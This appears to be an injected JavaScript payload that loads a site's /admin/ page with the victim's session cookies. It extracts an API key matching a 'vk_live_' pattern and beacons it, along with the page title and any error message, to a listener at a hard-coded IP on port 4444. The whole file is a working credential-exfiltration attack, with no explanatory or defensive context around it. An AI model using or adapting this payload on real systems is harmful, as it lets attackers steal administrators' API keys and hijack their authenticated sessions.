const listener = "http://10.139.32.179:4444";

// Inject script to read admin page
fetch("/admin/", { credentials: "include" })
    .then(r => r.text())
    .then(html => {
        // Search for API key
        const regex = /vk_live_[a-f0-9]{40}/g;
        const match = html.match(regex);
        if (match) {
            // Send via GET
            const img = new Image();
            img.src = listener + "/?key=" + match[0];
        }
        
        // Also send the page title or any identifiable info
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const title = doc.querySelector('title');
        if (title) {
            const img = new Image();
            img.src = listener + "/?title=" + encodeURIComponent(title.textContent);
        }
    })
    .catch(e => {
        const img = new Image();
        img.src = listener + "/?error=" + e.message;
    });
